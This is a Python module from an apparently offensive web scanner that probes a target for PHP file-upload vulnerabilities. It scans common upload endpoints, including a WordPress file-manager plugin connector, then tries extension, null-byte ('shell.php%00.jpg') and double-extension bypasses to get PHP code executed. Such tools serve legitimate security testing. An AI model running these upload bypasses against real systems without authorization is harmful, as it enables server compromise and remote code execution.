"""PHP File Upload Vulnerability Tester"""
from core.config import UPLOAD_PHP_CONTENT, UPLOAD_EXTENSIONS, R, R2, B, B2, W, Y, G, D, N
from core.engine import http_get, http_upload, save_report, print_vuln

UPLOAD_ENDPOINTS = [
    "/upload.php", "/upload", "/upload/index.php",
    "/admin/upload.php", "/admin/upload",
    "/api/upload", "/api/upload.php",
    "/file/upload", "/file/upload.php",
    "/media/upload.php", "/images/upload.php",
    "/wp-admin/media-new.php",
    "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
    "/assets/upload.php", "/uploads/index.php",
    "/ajax/upload.php", "/ajax/upload",
    "/process/upload.php", "/handler/upload.php",
]

def run(target):
    print(f"\n{B2}  Testing file upload vulnerabilities on {W}{target}{N}")
    vulns = 0
    findings = []

    # Find upload endpoints
    print(f"\n{D}  Scanning {len(UPLOAD_ENDPOINTS)} upload endpoints...{N}")
    upload_urls = []
    for ep in UPLOAD_ENDPOINTS:
        url = target + ep
        code, hdrs, body = http_get(url, timeout=8)
        if code in (200, 301, 302, 405):
            has_form = "multipart" in body.lower() or "file" in body.lower() or "upload" in body.lower()
            if code == 200 and has_form:
                print(f"   {G}[+]{W} Upload form found: {ep}{N}")
                upload_urls.append(url)
                findings.append({"type": "upload_endpoint", "url": url})
            elif code == 405:
                print(f"   {Y}[~]{W} Upload endpoint (POST only): {ep}{N}")
                upload_urls.append(url)

    if not upload_urls:
        print(f"\n{D}  No upload forms found. Testing common paths anyway...{N}")
        upload_urls = [target + "/upload.php", target + "/upload"]

    # Test upload with PHP extensions
    print(f"\n{D}  Testing PHP upload bypass techniques...{N}")
    for url in upload_urls[:3]:
        for ext in UPLOAD_EXTENSIONS:
            fname = f"test{ext}"
            code, body = http_upload(url, "file", fname, UPLOAD_PHP_CONTENT)
            if code == 0:
                continue

            # Check if PHP executed
            if "PHP2SHELL_UPLOAD_TEST_" in body:
                print_vuln("CRITICAL", f"PHP execution via upload!",
                           f"File {fname} executed as PHP", url)
                vulns += 1
                findings.append({"type": "upload_exec", "url": url, "ext": ext,
                                 "severity": "CRITICAL"})
                break

            # Check if file was accepted (200/201/302)
            if code in (200, 201, 302) and ext in (".php", ".phtml", ".php5"):
                if "success" in body.lower() or "uploaded" in body.lower():
                    print_vuln("HIGH", f"PHP file upload accepted ({ext})",
                               "File may be executable", url)
                    vulns += 1
                    findings.append({"type": "upload_accepted", "url": url, "ext": ext})

    # Test null byte bypass
    for url in upload_urls[:2]:
        code, body = http_upload(url, "file", "shell.php%00.jpg", UPLOAD_PHP_CONTENT)
        if "PHP2SHELL_UPLOAD_TEST_" in body:
            print_vuln("CRITICAL", "Null byte upload bypass!", url)
            vulns += 1
            findings.append({"type": "null_byte_bypass", "url": url})

    # Test double extension
    for url in upload_urls[:2]:
        code, body = http_upload(url, "file", "shell.php.jpg", UPLOAD_PHP_CONTENT)
        if "PHP2SHELL_UPLOAD_TEST_" in body:
            print_vuln("CRITICAL", "Double extension upload bypass!", url)
            vulns += 1
            findings.append({"type": "double_ext_bypass", "url": url})

    print(f"\n{G}  [✓] Upload scan complete — {vulns} findings{N}")
    if findings:
        save_report("upload_test", {"target": target, "findings": findings})
    return vulns
